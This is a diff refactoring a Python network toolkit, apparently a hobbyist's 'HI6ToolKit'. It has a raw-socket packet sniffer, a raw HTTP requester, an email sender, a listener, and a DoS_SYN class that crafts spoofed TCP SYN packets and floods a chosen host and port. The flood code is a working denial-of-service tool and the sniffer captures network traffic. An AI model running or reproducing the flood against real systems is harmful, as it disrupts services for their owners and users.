@@ -8,58 +8,28 @@ import sys
 import os
 import ssl
 
-ART = f"""
 
+class Constant :
+    INFO = f"""\n
+    █ [System] : [{sys.platform.upper()}, {time.ctime()}]
+    █ [Hostname] : [{socket.getfqdn()}]
+    █ [Python] : [{sys.implementation.name.title()} {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}]
 
-                        :::!~!!!!!:.
-                .xUHWH!! !!?M88WHX:.
-                .X*#M@$!!  !X!M$$$$$$WWx:
-            :!!!!!!?H! :!$!3hl0 w0rld!X:
-            !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
-            :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
-            ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
-            !:~~~ .:!M"T#$$$$WX??#MRRMMM!
-            ~?WuxiW*`   `"#$$$$8!!!!??!!!
-            :X- M$$$$       `"T#$T~!8$WUXU~
-            :%`  ~#$$$m:        ~!~ ?$$$$$$
-        :!`.-   ~T$$$$8xx.  .xWW- ~""##*".
-.....   -~~:<` !    ~?T#$$@@W@*?$$      /
-W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
-#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
-:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
-.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
-Wi.~!X$?!-~  : : ?$$$B$Wu("**$RM!
-$R@i.~~ !  :  :   ~$$$$$B$$en:``
-?MXT@Wx.~-~-~:      "##*$$$$M~
-
-
- _    _  _____    __  _______              _  _  __ _  _   
-| |  | ||_   _|  / / |__   __|            | || |/ /(_)| |  
-| |__| |  | |   / /_    | |    __    ___  | || ' /  _ | |_ 
-|  __  |  | |  |  _ \   | |  / _ \  / _ \ | ||  <  | || __|
-| |  | | _| |_ | (_) |  | | | (_) || (_) || || . \ | || |_ 
-|_|  |_||_____| \___/   |_|  \___/  \___/ |_||_|\_\|_| \__|
-
-
-█ [System] : [{sys.platform.upper()}, {time.ctime()}]
-█ [Hostname] : [{socket.getfqdn()}]
-█ [Python] : [{sys.implementation.name.title()} {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}]
-
-█ [GitHub] : [github.com/HI6Cypher]
-█ [Email] : [huaweisclu31@hotmail.com]
-
-
-"""
+    █ [GitHub] : [github.com/HI6Cypher]
+    █ [Email] : [huaweisclu31@hotmail.com]\n\n"""
+    MODULE = True if __name__ != "__main__" else False
+    TIME = time.time()
+    WIN = True if "win" in sys.platform.lower() else False
+    SYMBOL = chr(9608)
+    INPUT = "\nPress anykey to continue...\n"
 
 
 class Sniff :
     def __init__(self, host : str, proto : int) :
         self.host = host
         self.proto = proto
-        self.ioctl = True if "win" in sys.platform.lower() else False
-        self.__content = str()
-        self.__raw_buffer = bytes()
-        self.TIME = time.time()
+        self.ordered = str()
+        self.raw_buffer = bytes()
 
     def ip_header(self, raw_payload : bytes) :
         payload = struct.unpack("!BBHHHBBH4s4s", raw_payload)
@@ -124,14 +94,14 @@ class Sniff :
 
     def __proto(self) :
         if "win" in sys.platform.lower() and self.proto == socket.IPPROTO_TCP :
-            raise OSError("Can't use socket.IPPROTO_TCP on Winsock")
+            raise OSError("Can't use socket.IPPROTO_TCP")
         return self.proto
 
     def writedata(self, data : bytes) :
         counter = 1
-        data = str(data).split("\\")
+        secs = str(data).split("\\")
         text = "\t\t\t"
-        for i in data :
+        for i in secs :
             if counter % 10 != 0 :
                 text += f"{i}\\"
             else :
@@ -142,46 +112,45 @@ class Sniff :
 
     def __analysis_proto(self, iph : tuple, counter : int) :
         t = "\n\t\t"
-        self.__content += f"\n[*][{counter}][Connection]{time.time():_^33}\n\n"
+        self.ordered += f"\n[*][{counter}][Connection]{time.time():_^33}\n\n"
         text = f"\tIPv4 Packet :{t}Version : {iph[0]}  Header Length : {iph[1]}  Time of Service : {iph[2]}"
         text += f"{t}Total Length : {iph[3]}  Identification : {iph[4]}  Flags : {iph[5]}"
         text += f"{t}Fragment Offset : {iph[6]}  TTL : {iph[7]}  Protocol : {iph[8]}"
         text += f"{t}Checksum : {iph[9]}  Source : {iph[10]}  Destination : {iph[11]}"
-        self.__content += text + "\n\n"
+        self.ordered += text + "\n\n"
 
         if iph[8] == "ICMP" :
-            typ, cod, csm, idn, seq, data = self.icmp_header(self.__raw_buffer[iph[1]:])
+            typ, cod, csm, idn, seq, data = self.icmp_header(self.raw_buffer[iph[1]:])
             text = f"\tICMP Packet :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {csm}{t}Identifier : {idn}{t}Sequence : {seq}{t}Raw Data :\n{self.writedata(data)}"
-            self.__content += text + "\n"
+            self.ordered += text + "\n"
 
         elif iph[8] == "TCP" :
-            src, dst, seq, acn, oft, flg, win, csm, urg, data = self.tcp_header(self.__raw_buffer[iph[1]:])
+            src, dst, seq, acn, oft, flg, win, csm, urg, data = self.tcp_header(self.raw_buffer[iph[1]:])
             text = f"\tTCP Segment :{t}Source Port : {src}{t}Destination Port : {dst}{t}Sequence : {seq}{t}Acknowledgment : {acn}{t}Data Offset : {oft}{t}Flags :{t}"
-            self.__content += text + "\t"
+            self.ordered += text + "\t"
             text = f"URG:{flg[0]}  ACK:{flg[1]}  PSH:{flg[2]}{t}\tRST:{flg[3]}  SYN:{flg[4]}  FIN:{flg[5]}"
-            self.__content += text + t
+            self.ordered += text + t
             text = f"Window : {win}{t}Checksum : {csm}{t}Urgent Pointer : {urg}{t}Raw Data :\n{self.writedata(data)}"
-            self.__content += text
+            self.ordered += text
 
         elif iph[8] == "UDP" :
-            src, dst, tln, csm, data = self.udp_header(self.__raw_buffer[iph[1]:])
+            src, dst, tln, csm, data = self.udp_header(self.raw_buffer[iph[1]:])
             text = f"\tUDP Datagram :{t}Source Port : {src}{t}Destination Port : {dst}{t}Length : {tln}{t}Checksum : {csm}{t}Raw Data :\n{self.writedata(data)}"
-            self.__content += text + "\n"
+            self.ordered += text + "\n"
         return None
 
     def __save(self) :
-        path = f"data{self.TIME}.txt"
+        path = f"data{Constant.TIME}.txt"
         mode = "a" if os.path.exists(path) else "x"
         with open(path, mode) as file :
-            file.write(self.__content)
+            file.write(self.ordered)
         return None
 
-    def sniff(self, module : bool = False) :
-        self.module = module
+    def sniff(self) :
         try :
-            if not self.module :
-                print(ART)
-                input("\nPress anykey to continue...\n")
+            if not Constant.MODULE :
+                print(Constant.INFO)
+                input(Constant.INPUT)
         except KeyboardInterrupt :
             sys.exit(1)
         else :
@@ -193,20 +162,20 @@ class Sniff :
             with socket.socket(socket.AF_INET, socket.SOCK_RAW, self.__proto()) as sniff :
                 sniff.bind((self.host, 0))
                 sniff.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) if self.ioctl else None
+                sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) if Constant.WIN else None
                 counter = 1
                 try :
                     while True :
-                        self.__content = str()
-                        self.__raw_buffer = sniff.recvfrom(65535)[0]
-                        iph = self.ip_header(self.__raw_buffer[0:20])
+                        self.ordered = str()
+                        self.raw_buffer = sniff.recvfrom(65535)[0]
+                        iph = self.ip_header(self.raw_buffer[0:20])
                         self.__analysis_proto(iph, counter)
-                        self.__content = self.__content.expandtabs(4)
-                        print(self.__content) if not self.module else None
+                        self.ordered = self.ordered.expandtabs(4)
+                        print(self.ordered) if not Constant.MODULE else None
                         self.__save()
                         counter += 1
                 except KeyboardInterrupt :
-                    sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) if self.ioctl else None
+                    sniff.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF) if Constant.WIN else None
                     sys.exit(1)
         except Exception as error :
             print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
@@ -218,31 +187,29 @@ class DoS_SYN :
         self.host = socket.gethostbyname(host)
         self.port = int(port) if not isinstance(port, int) else port
         self.rate = int(rate) if not isinstance(rate, int) else rate
-        self.socket_protocol = socket.IPPROTO_TCP if "win" not in sys.platform.lower() else socket.IPPROTO_IP
-        self.SYMBOL = chr(9608)
 
     def ip_header(self, ver : int = 4, ihl : int = 5, tos : int = 0, tln : int = 40, 
                 idn : int = 0, flg : int = 0, oft : int = 0, ttl : int = 255, 
                 prt : int = socket.IPPROTO_TCP, csm : int = 0, src : str = str(), dst : str = str()) :
         ihl_ver = (ver << 4) + ihl
         flg_oft = (flg << 13) + oft
-        packet = struct.pack("BBHHHBBH4s4s", ihl_ver, tos, tln, idn, 
+        datagram = struct.pack("BBHHHBBH4s4s", ihl_ver, tos, tln, idn, 
                         flg_oft, ttl, prt, csm, src, dst)
-        return packet
+        return datagram
 
     def tcp_header(self, srp : int = 1337, dsp : int = 0, seq : int = 0, acn : int = 0, 
                 oft : int = 5, urg : int = 0, ack : int = 0, psh : int = 0, rst : int = 0, 
                 syn : int = 0, fin : int = 0, win : int = 35000, csm : int = 0, urp : int = 0) :
         oft <<=  4
         flg = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
-        packet = struct.pack("HHLLBBHHH", srp, dsp, seq, acn, oft, 
+        segment = struct.pack("HHLLBBHHH", srp, dsp, seq, acn, oft, 
                         flg, win, csm, urp)
-        return packet
+        return segment
 
     def pseudo_header(self, src : str = str(), dst : str = str(), res : int = 0, 
                     prt : int = socket.IPPROTO_TCP, tcp : int = 0) :
-        packet = struct.pack("4s4sBBH", src, dst, res, prt, tcp)
-        return packet
+        segment = struct.pack("4s4sBBH", src, dst, res, prt, tcp)
+        return segment
         
     def checksum(self, data : bytes) :
         checksum = 0
@@ -272,11 +239,11 @@ class DoS_SYN :
         payload = ip_header + tcp_header
         return payload
 
-    def flood(self, module : bool = False) :
+    def flood(self) :
         try :
-            if not module :
-                print(ART)
-                input("\nPress anykey to continue...\n")
+            if not Constant.MODULE :
+                print(Constant.INFO)
+                input(Constant.INPUT)
         except KeyboardInterrupt :
             sys.exit(1)
         else :
@@ -284,7 +251,7 @@ class DoS_SYN :
         return None
 
     def __flood(self) :
-        start_time = time.time()
+        socket_protocol = socket.IPPROTO_TCP if not Constant.WIN else socket.IPPROTO_IP
         self.rate += 32
         while self.rate % 32 != 0 :
             self.rate += 1
@@ -293,16 +260,16 @@ class DoS_SYN :
         try :
             for i in range(1, self.rate + 1) :
                 payload = self.prepare()
-                with socket.socket(socket.AF_INET, socket.SOCK_RAW, self.socket_protocol) as flood :
+                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) as flood :
                     flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                     flood.sendto(payload, (self.host, self.port))
                     flood.shutdown(socket.SHUT_RDWR)
                     if i == sec :
-                        print(f"[+] {(i // cons) * self.SYMBOL}  {sec} packets sent", end = "\r", flush = True)
+                        print(f"[+] {(i // cons) * Constant.SYMBOL}  {sec} packets sent", end = "\r", flush = True)
                         sec += cons
             else :
                 time.sleep(2)
-                end_time = round((time.time() - start_time), 2)
+                end_time = round((time.time() - Constant.TIME), 2)
                 print("\n[+] All packets have sent")
                 print(f"[-] {end_time}s")
         except KeyboardInterrupt :
@@ -321,14 +288,12 @@ class HTTP_Request :
         self.https = bool(https) if not isinstance(https, bool) else https
         self.response = bytes()
         self.response_header = bytes()
-        self.SYMBOL = chr(9608)
 
-    def request(self, module : bool = False) :
-        self.module = module
+    def request(self) :
         try :
-            if not self.module :
-                print(ART)
-                input("\nPress anykey to continue...\n")
+            if not Constant.MODULE :
+                print(Constant.INFO)
+                input(Constant.INPUT)
         except KeyboardInterrupt :
             sys.exit(1)
         else :
@@ -348,7 +313,7 @@ class HTTP_Request :
                             "Connection: close", 
                             "\r\n"]
                 payload = "\r\n".join(payload)
-                print(payload) if not self.module else None
+                print(payload) if not Constant.MODULE else None
                 flood.settimeout(30)
                 flood.connect((self.host, self.port))
                 flood.send(payload.encode())
@@ -362,14 +327,14 @@ class HTTP_Request :
                         self.response_header = raw_data[0]
                         self.response = raw_data[-1]
                         print(28 * chr(32), end = "\n")
-                        if not self.module :
+                        if not Constant.MODULE :
                             print(self.response_header.decode() if isinstance(self.response_header, bytes) else self.response_header, end = "\n\n")
                             print(self.response.decode() if self.decode else self.response)
                         flood.close()
                         break
                     else :
                         if counter != 16 :
-                            print(f"{counter * self.SYMBOL} Downloading", end = "\r", flush = True)
+                            print(f"{counter * Constant.SYMBOL} Downloading", end = "\r", flush = True)
                             counter += 1
                             space += 2 * chr(32)
                         else :
@@ -394,11 +359,11 @@ class SendEmail :
         self.subject = subject
         self.text = text
 
-    def sendemail(self, module : bool = False) :
+    def sendemail(self) :
         try :
-            if not module :
-                print(ART)
-                input("\nPress anykey to continue...\n")
+            if not Constant.MODULE :
+                print(Constant.INFO)
+                input(Constant.INPUT)
         except KeyboardInterrupt :
             sys.exit(1)
         print(f"[*] setting up socket : socket.SOCK_STREAM")
@@ -516,21 +481,19 @@ class Listen :
         self.timeout = int(timeout) if not isinstance(timeout, int) else timeout
         self.proto = proto
         self.all_data = str()
-        self.TIME = time.time()
 
     def __save(self) :
-        path = f"data{self.TIME}.txt"
+        path = f"data{Constant.TIME}.txt"
         mode = "a" if os.path.exists(path) else "x"
         with open(path, mode) as file :
             file.write(self.all_data.replace("\r", str()))
         return None
 
-    def listen(self, module : bool = False) :
-        self.module = module
+    def listen(self) :
         try :
-            if not self.module :
-                print(ART)
-                input("\nPress anykey to continue...\n")
+            if not Constant.MODULE :
+                print(Constant.INFO)
+                input(Constant.INPUT)
         except KeyboardInterrupt :
             sys.exit(1)
         else :
@@ -541,18 +504,18 @@ class Listen :
             try :
                 with socket.socket(socket.AF_INET, self.proto) as listen :
                     listen.settimeout(self.timeout)
-                    listen.bind((self.host, int(self.port)))
-                    listen.listen(5) if self.proto == socket.SOCK_STREAM else None
+                    listen.bind((self.host, self.port))
+                    listen.listen() if self.proto == socket.SOCK_STREAM else None
                     try :
                         while True :
                             conn, address = listen.accept() if self.proto == socket.SOCK_STREAM else listen.recvfrom(1024)
                             payload = conn.recv(1024) if self.proto == socket.SOCK_STREAM else conn
                             text = f"\n[{counter}][{time.time()}] connection from {address}\n"
-                            print(text) if not self.module else None
+                            print(text) if not Constant.MODULE else None
                             if payload :
                                 self.all_data += text + payload.decode()
                                 self.__save()
-                                print(payload.decode()) if not self.module else None
+                                print(payload.decode()) if not Constant.MODULE else None
                                 counter += 1
                                 self.all_data = str()
                     except KeyboardInterrupt :
@@ -561,7 +524,7 @@ class Listen :
                 print(f"[!] Error - {error or None} [CHECK SCRIPT CODE]")
             return None
 
-if __name__ == "__main__" :
+if not Constant.MODULE :
     info = "[GitHub] : github.com/HI6Cypher [Email] : huaweisclu31@hotmail.com"
     os.system("clear || cls")
     def manage_args() :
@@ -583,7 +546,7 @@ if __name__ == "__main__" :
         args = parser.parse_args()
 
         def help_message() :
-            print(ART)
+            print(Constant.INFO)
             parser.print_help()
             return None
 
@@ -645,8 +608,8 @@ if __name__ == "__main__" :
             listen.listen()
             return None
 
-        if args.Tool.upper() == "ART" :
-            print(ART)
+        if args.Tool.upper() == "INFO" :
+            print(Constant.INFO)
         elif args.Tool.upper() == "SNIFF" :
             PacketSniff_args(args.host, args.method)
         elif args.Tool.upper() == "DOS" :
